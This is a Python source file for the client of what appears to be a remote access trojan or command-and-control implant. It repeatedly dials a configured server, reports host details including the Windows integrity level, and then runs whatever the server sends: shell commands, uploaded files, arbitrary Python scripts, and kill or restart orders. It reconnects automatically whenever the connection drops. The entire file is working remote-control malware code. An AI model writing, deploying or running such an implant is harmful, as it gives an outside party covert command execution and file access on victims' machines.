import json
import os
import platform
import socket
import subprocess
import sys
import time

from client.command import Command, get_command_list, execute_command
from client.config import SERVER_ADDR
from client.server import Server
from common.util import logger, get_write_stream

if os.name == 'nt':
    from client.command import INTEGRITY_LEVEL, EXECUTABLE_PATH


class Client:
    def __init__(self, address):
        self.address = address
        self.server = Server()

    def connect(self):
        logger.info(f'Connecting to {self.address}')
        while not self.server.connect(self.address):
            time.sleep(5)
        info = {
            'os': platform.platform(),
            'hostname': socket.gethostname(),
            'integrity': INTEGRITY_LEVEL if os.name == 'nt' else 'N/A',
            'cwd': os.getcwd(),
            'commands': get_command_list()
        }
        info = json.dumps(info).encode()
        self.server.send(head={'type': 'info', 'length': len(info)}, bytes=info)
        logger.info('Connected')

    def wait(self):
        while True:
            try:
                head = self.server.recv_head()
                command_id = head['id']
                command_type = head['type']
                result = None
                try:
                    if command_type == 'file':
                        filename = head['filename']
                        self.server.recv_body(head, file_stream=get_write_stream(filename))
                        result = 1, f'File uploaded to: {os.path.abspath(filename)}'
                    else:
                        command = self.server.recv_body(head)
                        if command_type == 'command':
                            if command == 'kill':
                                self.server.close()
                                sys.exit(0)
                            elif command == 'reset':
                                subprocess.Popen(EXECUTABLE_PATH)
                                self.server.close()
                                sys.exit(0)
                            Command.server = self.server
                            Command.id = command_id
                            result = execute_command(command)
                        elif command_type == 'script':
                            result = Command.pyexec(command, json.loads(head['args']))
                except Exception as e:
                    result = 0, f'{e}\n'
                if result:
                    self.server.send_result(*result, id=command_id)
            except SystemExit:
                logger.info('Server closed this connection')
                break
            except socket.error:
                logger.error('Connection closed')
                self.server.close()
                self.server = Server()
                self.connect()


if __name__ == '__main__':
    client = Client(SERVER_ADDR)
    try:
        client.connect()
        client.wait()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(e)
